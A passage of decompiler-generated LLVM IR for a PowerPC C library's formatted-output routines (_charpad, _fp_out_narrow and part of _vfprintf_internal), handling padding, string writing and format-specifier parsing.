  %v0_1000e1f8 = load i32, i32* @r4, align 4
  store i32 %v0_1000e1f8, i32* @r29, align 4
  store i32 %v0_1000e1f0, i32* @r31, align 4
  %v1_1000e204 = add i32 %v0_1000e1f0, 52
  %v2_1000e204 = inttoptr i32 %v1_1000e204 to i32*
  %v3_1000e204 = load i32, i32* %v2_1000e204, align 4
  store i32 %v3_1000e204, i32* @r28, align 4
  %v0_1000e208 = load i32, i32* @r5, align 4
  store i32 %v0_1000e208, i32* @r27, align 4
  %v2_1000e20c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e20c, i32* @r3, align 4
  %v3_1000e214 = icmp eq i32 %v3_1000e204, 0
  br i1 %v3_1000e214, label %dec_label_pc_1000e220, label %dec_label_pc_1000e22c

dec_label_pc_1000e220:                            ; preds = %entry
  %v0_1000e220 = call i32 @__pthread_return_void()
  %v0_1000e228 = call i32 @__pthread_return_0()
  %v0_1000e22c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e22c

dec_label_pc_1000e22c:                            ; preds = %entry, %dec_label_pc_1000e220
  %v0_1000e22c = phi i32 [ %v0_1000e1f0, %entry ], [ %v0_1000e22c.pre, %dec_label_pc_1000e220 ]
  %v1_1000e22c = inttoptr i32 %v0_1000e22c to i16*
  %v2_1000e22c = load i16, i16* %v1_1000e22c, align 2
  %v3_1000e22c = zext i16 %v2_1000e22c to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_1000e22c, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_1000e23c = call i32 @__asm_rlwinm(i32 %v3_1000e22c, i32 0, i32 24, i32 25)
  %v3_1000e240 = icmp eq i32 %v1_1000e23c, 192
  br i1 %v3_1000e240, label %dec_label_pc_1000e254, label %dec_label_pc_1000e248

dec_label_pc_1000e248:                            ; preds = %dec_label_pc_1000e22c
  store i32 268493388, i32* @lr, align 4
  %v0_1000e248 = call i32 @__stdio_trans2w_o()
  %v3_1000e24c = icmp eq i32 %v0_1000e248, 0
  br i1 %v3_1000e24c, label %dec_label_pc_1000e254, label %dec_label_pc_1000e268

dec_label_pc_1000e254:                            ; preds = %dec_label_pc_1000e248, %dec_label_pc_1000e22c
  %v0_1000e254 = load i32, i32* @r29, align 4
  store i32 %v0_1000e254, i32* @r4, align 4
  %v0_1000e258 = load i32, i32* @r27, align 4
  store i32 %v0_1000e258, i32* @r5, align 4
  %v0_1000e25c = load i32, i32* @r31, align 4
  store i32 %v0_1000e25c, i32* @r3, align 4
  store i32 268493412, i32* @lr, align 4
  %v0_1000e260 = call i32 @_vfprintf_internal()
  store i32 %v0_1000e260, i32* @r30, align 4
  br label %dec_label_pc_1000e268

dec_label_pc_1000e268:                            ; preds = %dec_label_pc_1000e248, %dec_label_pc_1000e254
  %v0_1000e268 = load i32, i32* @r28, align 4
  %v3_1000e268 = icmp eq i32 %v0_1000e268, 0
  store i32 %v2_1000e20c, i32* @r3, align 4
  br i1 %v3_1000e268, label %dec_label_pc_1000e278, label %dec_label_pc_1000e27c

dec_label_pc_1000e278:                            ; preds = %dec_label_pc_1000e268
  %v0_1000e278 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e27c

dec_label_pc_1000e27c:                            ; preds = %dec_label_pc_1000e268, %dec_label_pc_1000e278
  %v0_1000e280 = load i32, i32* @r30, align 4
  ret i32 %v0_1000e280

; uselistorder directives
  uselistorder i32 %v0_1000e22c, { 1, 0 }
  uselistorder i32 %v0_1000e1f0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e27c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e268, { 1, 0 }
  uselistorder label %dec_label_pc_1000e22c, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000e2bc4 = icmp eq i32 %arg3, 0
  %v2_1000e2c0 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000e2bc4, label %dec_label_pc_1000e2dc, label %dec_label_pc_1000e2d0

dec_label_pc_1000e2b8:                            ; preds = %dec_label_pc_1000e2d0
  %v1_1000e2b8 = add i32 %v0_1000e2b8, -1
  store i32 %v1_1000e2b8, i32* @r31, align 4
  %v3_1000e2bc = icmp eq i32 %v1_1000e2b8, 0
  %v0_1000e2c8 = load i32, i32* @r29, align 4
  br i1 %v3_1000e2bc, label %dec_label_pc_1000e2dc.loopexit, label %dec_label_pc_1000e2d0

dec_label_pc_1000e2d0:                            ; preds = %entry, %dec_label_pc_1000e2b8
  %v0_1000e2c86 = phi i32 [ %v0_1000e2c8, %dec_label_pc_1000e2b8 ], [ %arg1, %entry ]
  store i32 268493524, i32* @lr, align 4
  %v3_1000e2d0 = inttoptr i32 %v0_1000e2c86 to i16*
  %v4_1000e2d0 = call i32 @__stdio_fwrite(i32 %v2_1000e2c0, i32 1, i16* %v3_1000e2d0)
  %v3_1000e2d4 = icmp eq i32 %v4_1000e2d0, 1
  %v0_1000e2b8 = load i32, i32* @r31, align 4
  br i1 %v3_1000e2d4, label %dec_label_pc_1000e2b8, label %dec_label_pc_1000e2dc.loopexit

dec_label_pc_1000e2dc.loopexit:                   ; preds = %dec_label_pc_1000e2b8, %dec_label_pc_1000e2d0
  %v0_1000e2e0.ph = phi i32 [ %v0_1000e2b8, %dec_label_pc_1000e2d0 ], [ 0, %dec_label_pc_1000e2b8 ]
  %v1_1000e2e0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e2dc

dec_label_pc_1000e2dc:                            ; preds = %dec_label_pc_1000e2dc.loopexit, %entry
  %v1_1000e2e0 = phi i32 [ 0, %entry ], [ %v1_1000e2e0.pre, %dec_label_pc_1000e2dc.loopexit ]
  %v0_1000e2e0 = phi i32 [ 0, %entry ], [ %v0_1000e2e0.ph, %dec_label_pc_1000e2dc.loopexit ]
  %v2_1000e2e0 = sub i32 %v1_1000e2e0, %v0_1000e2e0
  ret i32 %v2_1000e2e0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e2dc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2d0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1000e308 = and i32 %arg2, 128
  %v3_1000e308 = icmp eq i32 %v1_1000e308, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000e308, label %dec_label_pc_1000e358, label %dec_label_pc_1000e324

dec_label_pc_1000e324:                            ; preds = %entry
  %v0_1000e324 = call i32 @__GI_strlen()
  %v0_1000e328 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000e324, i32* @r31, align 4
  %v0_1000e330 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000e334 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000e334 = sub i32 %v1_1000e334, %v0_1000e324
  store i32 %v2_1000e334, i32* %r29.global-to-local, align 4
  store i32 %v0_1000e324, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000e334, 1
  br i1 %tmp7, label %dec_label_pc_1000e358, label %dec_label_pc_1000e344

dec_label_pc_1000e344:                            ; preds = %dec_label_pc_1000e324
  %v1_1000e328 = urem i32 %v0_1000e328, 128
  store i32 268493640, i32* @lr, align 4
  %v3_1000e344 = trunc i32 %v1_1000e328 to i8
  %v4_1000e344 = call i32 @_charpad(i32 %v0_1000e330, i8 %v3_1000e344, i32 %v2_1000e334)
  %v0_1000e348 = load i32, i32* @r31, align 4
  store i32 %v0_1000e348, i32* %r30.global-to-local, align 4
  %v1_1000e34c = load i32, i32* @r29, align 4
  %v4_1000e34c = icmp eq i32 %v4_1000e344, %v1_1000e34c
  store i32 %v4_1000e344, i32* @r28, align 4
  br i1 %v4_1000e34c, label %dec_label_pc_1000e344.dec_label_pc_1000e358_crit_edge, label %dec_label_pc_1000e37c

dec_label_pc_1000e344.dec_label_pc_1000e358_crit_edge: ; preds = %dec_label_pc_1000e344
  %v0_1000e364.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000e358

dec_label_pc_1000e358:                            ; preds = %dec_label_pc_1000e344.dec_label_pc_1000e358_crit_edge, %dec_label_pc_1000e324, %entry
  %v0_1000e364 = phi i32 [ %v0_1000e364.pre, %dec_label_pc_1000e344.dec_label_pc_1000e358_crit_edge ], [ %v0_1000e330, %dec_label_pc_1000e324 ], [ %arg1, %entry ]
  %v0_1000e360 = phi i32 [ %v0_1000e348, %dec_label_pc_1000e344.dec_label_pc_1000e358_crit_edge ], [ %v0_1000e324, %dec_label_pc_1000e324 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000e360, 1
  br i1 %tmp8, label %dec_label_pc_1000e378, label %dec_label_pc_1000e370

dec_label_pc_1000e370:                            ; preds = %dec_label_pc_1000e358
  %v0_1000e35c = load i32, i32* @r27, align 4
  store i32 268493684, i32* @lr, align 4
  %v3_1000e370 = inttoptr i32 %v0_1000e364 to i16*
  %v4_1000e370 = call i32 @__stdio_fwrite(i32 %v0_1000e35c, i32 %v0_1000e360, i16* %v3_1000e370)
  br label %dec_label_pc_1000e378

dec_label_pc_1000e378:                            ; preds = %dec_label_pc_1000e358, %dec_label_pc_1000e370
  %v1_1000e378 = phi i32 [ 0, %dec_label_pc_1000e358 ], [ %v4_1000e370, %dec_label_pc_1000e370 ]
  %v0_1000e378 = load i32, i32* @r28, align 4
  %v2_1000e378 = add i32 %v0_1000e378, %v1_1000e378
  br label %dec_label_pc_1000e37c

dec_label_pc_1000e37c:                            ; preds = %dec_label_pc_1000e344, %dec_label_pc_1000e378
  %v0_1000e380 = phi i32 [ %v4_1000e344, %dec_label_pc_1000e344 ], [ %v2_1000e378, %dec_label_pc_1000e378 ]
  ret i32 %v0_1000e380

; uselistorder directives
  uselistorder i32 %v0_1000e360, { 1, 0 }
  uselistorder i32 %v2_1000e334, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e37c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e378, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000e398 = load i32, i32* @lr, align 4
  store i32 %v0_1000e398, i32* %r0.global-to-local, align 4
  %v2_1000e3a0 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000e3a0, i32* %r30.global-to-local, align 4
  %v0_1000e3a4 = load i32, i32* @r3, align 4
  store i32 %v0_1000e3a4, i32* %r24.global-to-local, align 4
  %v0_1000e3b0 = load i32, i32* @r5, align 4
  store i32 %v0_1000e3b0, i32* %r31.global-to-local, align 4
  %v0_1000e3b4 = load i32, i32* @r4, align 4
  store i32 %v0_1000e3b4, i32* @r29, align 4
  store i32 268493756, i32* @lr, align 4
  %v1_1000e3b8 = bitcast i8** %stack_var_-200 to i32*
  %v2_1000e3b8 = call i32 @_ppfs_init(i32* %v1_1000e3b8)
  %tmp72 = icmp sgt i32 %v2_1000e3b8, -1
  br i1 %tmp72, label %dec_label_pc_1000e3ec, label %dec_label_pc_1000e3c4

dec_label_pc_1000e3c4:                            ; preds = %entry
  %v3_1000e3c4 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000e3c4 = ptrtoint i8* %v3_1000e3c4 to i32
  store i32 %v4_1000e3c4, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000e3c4, i32* @r3, align 4
  %v0_1000e3d0 = call i32 @__GI_strlen()
  %v3_1000e3d4 = icmp eq i32 %v0_1000e3d0, 0
  br i1 %v3_1000e3d4, label %dec_label_pc_1000e9ec, label %dec_label_pc_1000e3dc

dec_label_pc_1000e3dc:                            ; preds = %dec_label_pc_1000e3c4
  %v0_1000e3dc = load i32, i32* @r31, align 4
  %v0_1000e3e0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e3e8.1043 to i32), i32* @lr, align 4
  %v3_1000e3e4 = inttoptr i32 %v0_1000e3e0 to i16*
  %v4_1000e3e4 = call i32 @__stdio_fwrite(i32 %v0_1000e3dc, i32 %v0_1000e3d0, i16* %v3_1000e3e4)
  br label %dec_label_pc_1000e9ec

dec_label_pc_1000e3ec:                            ; preds = %entry
  %v0_1000e3f0 = load i32, i32* @r31, align 4
  store i32 268493816, i32* @lr, align 4
  %v2_1000e3f4 = call i32 @_ppfs_prepargs(i32 %v2_1000e3a0, i32 %v0_1000e3f0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000e48c = zext i8 %tmp59 to i32
  %v2_1000e490 = icmp sgt i32 %tmp60, 0
  %v2_1000e494 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000e4b8 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000e4bc = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000e4f0 = icmp eq i32 %tmp57, 0
  %v2_1000e84c = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000e76c = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000e770 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000e5e4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000e6c0 = icmp eq i32 %tmp57, 1
  %v2_1000e664 = icmp ugt i32 %tmp57, 2
  %v4_1000e5a4 = zext i8 %tmp55 to i32
  %v0_1000e9d8.pre = load i32, i32* @r29, align 4
  %v1_1000e4a4 = mul nuw nsw i32 %v4_1000e48c, 8
  %v2_1000e4a8 = add i32 %v2_1000e494, %v1_1000e4a4
  %v1_1000e4ac = add i32 %v2_1000e4a8, -8
  %v1_1000e4c0 = add i32 %tmp58, 1
  %v2_1000e518 = icmp ugt i32 %tmp57, 7
  %v2_1000e6f8 = icmp ugt i32 %tmp57, 15
  %v2_1000e72c = icmp ugt i32 %tmp57, 17
  %v3_1000e72c = icmp eq i32 %tmp57, 17
  %v2_1000e7d4 = icmp ugt i32 %tmp57, 19
  %v3_1000e7d4 = icmp eq i32 %tmp57, 19
  %v3_1000e840 = icmp eq i32 %tmp57, 20
  %v1_1000e530 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1001b2a0.1045 to i32), i32 -1)
  %v2_1000e530 = inttoptr i32 %v1_1000e530 to i8*
  %v3_1000e670 = icmp eq i32 %tmp57, 3
  %v3_1000e680 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000e9d8

dec_label_pc_1000e404.backedge:                   ; preds = %dec_label_pc_1000e458, %dec_label_pc_1000e410
  %storemerge13.in = phi i32 [ %v1_1000e420, %dec_label_pc_1000e410 ], [ %v1_1000e458, %dec_label_pc_1000e458 ]
  %v1_1000e41816 = phi i32 [ %v0_1000e430, %dec_label_pc_1000e410 ], [ %v1_1000e458, %dec_label_pc_1000e458 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1000e404

dec_label_pc_1000e404:                            ; preds = %dec_label_pc_1000e404.backedge, %dec_label_pc_1000e9d8
  %v0_1000e430 = phi i32 [ %v1_1000e41816, %dec_label_pc_1000e404.backedge ], [ %v0_1000e9d8, %dec_label_pc_1000e9d8 ]
  %v1_1000e420 = phi i32 [ %storemerge13, %dec_label_pc_1000e404.backedge ], [ %v0_1000e9d8, %dec_label_pc_1000e9d8 ]
  %v1_1000e404 = inttoptr i32 %v1_1000e420 to i8*
  %v2_1000e404 = load i8, i8* %v1_1000e404, align 1
  %v3_1000e404 = zext i8 %v2_1000e404 to i32
  store i32 %v3_1000e404, i32* %r0.global-to-local, align 4
  %v3_1000e408 = icmp eq i8 %v2_1000e404, 0
  br i1 %v3_1000e408, label %dec_label_pc_1000e418, label %dec_label_pc_1000e410

dec_label_pc_1000e410:                            ; preds = %dec_label_pc_1000e404
  %v3_1000e410 = icmp eq i8 %v2_1000e404, 37
  br i1 %v3_1000e410, label %dec_label_pc_1000e418, label %dec_label_pc_1000e404.backedge

dec_label_pc_1000e418:                            ; preds = %dec_label_pc_1000e410, %dec_label_pc_1000e404
  %v4_1000e418 = icmp eq i32 %v1_1000e420, %v0_1000e430
  br i1 %v4_1000e418, label %dec_label_pc_1000e44c, label %dec_label_pc_1000e420

dec_label_pc_1000e420:                            ; preds = %dec_label_pc_1000e418
  %v2_1000e420 = sub i32 %v1_1000e420, %v0_1000e430
  store i32 %v2_1000e420, i32* @r31, align 4
  %v4_1000e420 = icmp sgt i32 %v2_1000e420, 0
  br i1 %v4_1000e420, label %dec_label_pc_1000e430, label %dec_label_pc_1000e440

dec_label_pc_1000e430:                            ; preds = %dec_label_pc_1000e420
  %v0_1000e438 = load i32, i32* %r24.global-to-local, align 4
  store i32 268493888, i32* @lr, align 4
  %v3_1000e43c = inttoptr i32 %v0_1000e438 to i16*
  %v4_1000e43c = call i32 @__stdio_fwrite(i32 %v0_1000e430, i32 %v2_1000e420, i16* %v3_1000e43c)
  %v1_1000e440.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e440

dec_label_pc_1000e440:                            ; preds = %dec_label_pc_1000e420, %dec_label_pc_1000e430
  %v1_1000e448 = phi i32 [ %v1_1000e440.pre, %dec_label_pc_1000e430 ], [ %v2_1000e420, %dec_label_pc_1000e420 ]
  %storemerge2 = phi i32 [ %v4_1000e43c, %dec_label_pc_1000e430 ], [ 0, %dec_label_pc_1000e420 ]
  %v4_1000e440 = icmp eq i32 %storemerge2, %v1_1000e448
  br i1 %v4_1000e440, label %dec_label_pc_1000e448, label %dec_label_pc_1000e9e8

dec_label_pc_1000e448:                            ; preds = %dec_label_pc_1000e440
  %v0_1000e448 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000e448 = add i32 %v0_1000e448, %v1_1000e448
  store i32 %v2_1000e448, i32* %r23.global-to-local, align 4
  %v0_1000e44c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e44c

dec_label_pc_1000e44c:                            ; preds = %dec_label_pc_1000e418, %dec_label_pc_1000e448
  %v0_1000e458 = phi i32 [ %v0_1000e430, %dec_label_pc_1000e418 ], [ %v0_1000e44c.pre, %dec_label_pc_1000e448 ]
  %v1_1000e44c = inttoptr i32 %v0_1000e458 to i8*
  %v2_1000e44c = load i8, i8* %v1_1000e44c, align 1
  %v3_1000e44c = zext i8 %v2_1000e44c to i32
  store i32 %v3_1000e44c, i32* %r0.global-to-local, align 4
  %v3_1000e450 = icmp eq i8 %v2_1000e44c, 0
  br i1 %v3_1000e450, label %dec_label_pc_1000e9ec, label %dec_label_pc_1000e458

dec_label_pc_1000e458:                            ; preds = %dec_label_pc_1000e44c
  %v1_1000e458 = add i32 %v0_1000e458, 1
  %v2_1000e458 = inttoptr i32 %v1_1000e458 to i8*
  %v3_1000e458 = load i8, i8* %v2_1000e458, align 1
  %v4_1000e458 = zext i8 %v3_1000e458 to i32
  store i32 %v4_1000e458, i32* %r0.global-to-local, align 4
  %v3_1000e460 = icmp eq i8 %v3_1000e458, 37
  br i1 %v3_1000e460, label %dec_label_pc_1000e404.backedge, label %dec_label_pc_1000e468

dec_label_pc_1000e468:                            ; preds = %dec_label_pc_1000e458
  store i32 %v2_1000e3a0, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000e458, i8** %stack_var_-200, align 4
  store i32 268493952, i32* @lr, align 4
  %v3_1000e47c = call i32 @_ppfs_parsespec(i32* %v1_1000e3b8, i32 %v1_1000e458)
  store i32 %v2_1000e3a0, i32* @r3, align 4
  store i32 268493960, i32* @lr, align 4
  %v0_1000e484 = call i32 @_ppfs_setargs()
  store i32 %v4_1000e48c, i32* %r7.global-to-local, align 4
  store i32 %v2_1000e494, i32* %r0.global-to-local, align 4
  br i1 %v2_1000e490, label %dec_label_pc_1000e4a4, label %dec_label_pc_1000e4b0

dec_label_pc_1000e4a4:                            ; preds = %dec_label_pc_1000e468
  br label %dec_label_pc_1000e4b0

dec_label_pc_1000e4b0:                            ; preds = %dec_label_pc_1000e468, %dec_label_pc_1000e4a4
  %v0_1000e4dc82 = phi i32 [ %v1_1000e4ac, %dec_label_pc_1000e4a4 ], [ %v2_1000e494, %dec_label_pc_1000e468 ]
  store i32 %v0_1000e4dc82, i32* %r10.global-to-local, align 4
  store i32 %v2_1000e4b8, i32* %r8.global-to-local, align 4
  store i32 %v1_1000e4c0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000e4e0.preheader, label %dec_label_pc_1000e4e0.preheader.thread

dec_label_pc_1000e4e0.preheader.thread:           ; preds = %dec_label_pc_1000e4b0
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e4ec

dec_label_pc_1000e4e0.preheader:                  ; preds = %dec_label_pc_1000e4b0
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000e4bc, label %dec_label_pc_1000e4ec, label %dec_label_pc_1000e4d8.preheader

dec_label_pc_1000e4d8.preheader:                  ; preds = %dec_label_pc_1000e4e0.preheader
  store i32 %v0_1000e4dc82, i32* %stack_var_-344, align 4
  %v1_1000e4dc83 = add i32 %v0_1000e4dc82, 8
  store i32 %v1_1000e4dc83, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000e4e888 = add i32 %tmp58, -1
  store i32 %v1_1000e4e888, i32* %ctr.global-to-local, align 4
  %v2_1000e4e889 = icmp eq i32 %v1_1000e4e888, 0
  br i1 %v2_1000e4e889, label %dec_label_pc_1000e4ec, label %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge

dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge: ; preds = %dec_label_pc_1000e4d8.preheader, %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge.dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge_crit_edge
  %v1_1000e4d8.pre = phi i32 [ %v1_1000e4d8.pre.pre, %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge.dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge_crit_edge ], [ %v2_1000e4b8, %dec_label_pc_1000e4d8.preheader ]
  %v1_1000e4e091 = phi i32 [ %v1_1000e4e0, %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge.dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000e4d8.preheader ]
  %v1_1000e4dc90 = phi i32 [ %v1_1000e4dc, %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge.dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge_crit_edge ], [ %v1_1000e4dc83, %dec_label_pc_1000e4d8.preheader ]
  %v3_1000e4d8 = add i32 %v1_1000e4d8.pre, %v1_1000e4e091
  %v4_1000e4d8 = inttoptr i32 %v3_1000e4d8 to i32*
  store i32 %v1_1000e4dc90, i32* %v4_1000e4d8, align 4
  %v0_1000e4dc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e4dc = add i32 %v0_1000e4dc, 8
  store i32 %v1_1000e4dc, i32* %r10.global-to-local, align 4
  %v0_1000e4e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e4e0 = mul i32 %v0_1000e4e0, 4
  store i32 %v1_1000e4e0, i32* %r0.global-to-local, align 4
  %v1_1000e4e4 = add i32 %v0_1000e4e0, 1
  store i32 %v1_1000e4e4, i32* %r11.global-to-local, align 4
  %v0_1000e4e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e4e8 = add i32 %v0_1000e4e8, -1
  store i32 %v1_1000e4e8, i32* %ctr.global-to-local, align 4
  %v2_1000e4e8 = icmp eq i32 %v1_1000e4e8, 0
  br i1 %v2_1000e4e8, label %dec_label_pc_1000e4ec, label %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge.dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge_crit_edge

dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge.dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge_crit_edge: ; preds = %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge
  %v1_1000e4d8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge

dec_label_pc_1000e4ec:                            ; preds = %dec_label_pc_1000e4d8.preheader, %dec_label_pc_1000e4d8.dec_label_pc_1000e4d8_crit_edge, %dec_label_pc_1000e4e0.preheader.thread, %dec_label_pc_1000e4e0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000e4f0, label %dec_label_pc_1000e4f8, label %dec_label_pc_1000e518

dec_label_pc_1000e4f8:                            ; preds = %dec_label_pc_1000e4ec
  %v0_1000e4fc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000e4fc, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1000e4fc, 0
  %v1_1000e504 = zext i1 %tmp96 to i32
  %v2_1000e504 = ashr i32 %v0_1000e4fc, 31
  %v3_1000e504 = and i32 %v2_1000e504, -2
  %v4_1000e504 = or i32 %v3_1000e504, %v1_1000e504
  store i32 %v4_1000e504, i32* @r5, align 4
  %v1_1000e50c = call i32 @__asm_rlwinm(i32 %v0_1000e62c, i32 0, i32 20, i32 23)
  store i32 %v1_1000e50c, i32* @r4, align 4
  %v1_1000e510 = inttoptr i32 %v1_1000e50c to i16*
  %v2_1000e510 = call i32 @_store_inttype(i16* %v1_1000e510)
  br label %dec_label_pc_1000e9d4

dec_label_pc_1000e518:                            ; preds = %dec_label_pc_1000e4ec
  br i1 %v2_1000e518, label %dec_label_pc_1000e6f8, label %dec_label_pc_1000e520

dec_label_pc_1000e520:                            ; preds = %dec_label_pc_1000e518
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000e530 = load i8, i8* %v2_1000e530, align 1
  %v4_1000e530 = zext i8 %v3_1000e530 to i32
  store i32 %v4_1000e530, i32* %r30.global-to-local, align 4
  %v3_1000e534 = icmp eq i8 %v3_1000e530, 10
  br i1 %v3_1000e534, label %dec_label_pc_1000e53c, label %dec_label_pc_1000e564

dec_label_pc_1000e53c:                            ; preds = %dec_label_pc_1000e520
  store i32 %v0_1000e62c, i32* %r0.global-to-local, align 4
  %v1_1000e540 = call i32 @__asm_rlwinm(i32 %v0_1000e62c, i32 26, i32 31, i32 31)
  %v1_1000e544 = call i32 @__asm_rlwinm(i32 %v0_1000e62c, i32 27, i32 31, i32 31)
  %v3_1000e548 = icmp eq i32 %v1_1000e540, 0
  %v2_1000e54c = icmp ne i32 %v1_1000e544, 0
  %not.v2_1000e54c = xor i1 %v2_1000e54c, true
  %v6_1000e550 = sext i1 %not.v2_1000e54c to i32
  store i32 %v6_1000e550, i32* %r0.global-to-local, align 4
  %v1_1000e558 = select i1 %v2_1000e54c, i32 44, i32 87
  store i32 %v1_1000e558, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e548, label %dec_label_pc_1000e564, label %dec_label_pc_1000e560

dec_label_pc_1000e560:                            ; preds = %dec_label_pc_1000e53c
  %v1_1000e560 = or i32 %v1_1000e558, 128
  store i32 %v1_1000e560, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e564

dec_label_pc_1000e564:                            ; preds = %dec_label_pc_1000e520, %dec_label_pc_1000e53c, %dec_label_pc_1000e560
  %v0_1000e564 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e564 = icmp ugt i32 %v0_1000e564, 5
  br i1 %v2_1000e564, label %dec_label_pc_1000e58c, label %dec_label_pc_1000e56c

